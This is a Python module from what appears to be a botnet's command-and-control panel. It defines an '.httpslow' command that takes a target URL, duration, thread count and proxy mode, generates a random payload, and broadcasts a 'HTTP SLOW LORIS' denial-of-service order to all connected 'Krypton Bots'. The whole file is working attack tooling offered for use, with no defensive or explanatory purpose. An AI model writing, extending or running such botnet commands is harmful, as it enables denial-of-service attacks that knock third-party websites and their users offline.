import time
import random
import string
from colorama import Fore

def generate_payload(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def httpslow(args, validate_time, send, client, ansi_clear, broadcast, data):
    maxThreads = 100 # Threads Limit (recommended 100 or 130)
    maxPayloadSize = 2048 # Maximum payload size in bytes

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sTIME:%s %s
            %sTYPE:%s %s
         %sTHREADS:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, attackType, Fore.CYAN, Fore.LIGHTWHITE_EX, threadx, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP SLOW LORIS')

        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                if attackType.upper() in ['PROXY', 'NORMAL']:
                    # Generate dynamic payload for each attack
                    payload_size = random.randint(512, maxPayloadSize)
                    data['payload'] = generate_payload(payload_size)
                    data['retry_count'] = 3  # Add retry mechanism
                    data['timeout'] = 30  # Add connection timeout
                    for x in xxxx.split('\n'):
                        send(client, '\x1b[3;31;40m'+ x)
                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpslow [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')